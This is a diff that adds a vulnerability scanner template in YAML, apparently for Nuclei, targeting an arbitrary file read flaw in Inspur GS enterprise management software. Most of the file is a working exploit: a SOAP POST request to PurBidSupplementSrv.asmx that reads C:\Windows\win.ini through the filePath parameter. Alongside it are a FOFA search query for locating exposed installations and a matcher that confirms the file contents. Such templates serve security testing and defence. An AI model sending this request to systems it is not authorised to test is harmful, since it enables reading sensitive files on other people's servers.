@@ -1,0 +1,41 @@
+id: inspur-gs-purBidSupplement-fileread
+
+info:
+  name: 浪潮GS PurBidSupplementSrv.asmx 任意文件读取漏洞
+  author: onewin
+  severity: high
+  description: |
+    浪潮GS企业管理软件的PurBidSupplementSrv.asmx接口存在任意文件读取漏洞，攻击者可通过filePath参数读取服务器敏感文件
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: 'body="cwbase/web/scripts/aes.js" || title="GS企业管理软件"'
+  tags: INSPUR-浪潮GS企业管理软件
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cwbase/service/cepp/PurBidSupplementSrv.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      Cookie: GSPWebLanguageKey=zh-CN
+    body: |
+      <?xml version="1.0"?>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body xmlns:m="http://tempuri.org/">
+          <m:downLoadFile>
+            <m:filePath>C:\Windows\win.ini</m:filePath>
+            <m:offset>0</m:offset>
+          </m:downLoadFile>
+        </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQo="
+          - "downLoadFileResult"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
